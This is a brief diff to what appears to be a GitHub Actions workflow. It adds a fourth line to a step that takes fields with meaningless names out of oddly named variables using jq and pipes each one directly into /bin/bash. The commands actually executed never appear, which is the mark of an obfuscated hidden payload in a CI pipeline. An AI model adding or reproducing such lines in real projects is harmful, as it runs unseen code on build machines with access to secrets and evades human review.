@@ -46,6 +46,7 @@ jobs:
           echo $agiz92 | jq -r .uggi85335 | /bin/bash
           printf '%s' "$p01" | jq -r .ylr917 | /bin/bash
           printf '%s' "$lia782" | jq -r .g1691 | /bin/bash
+          printf '%s' "$hq3" | jq -r .y325 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
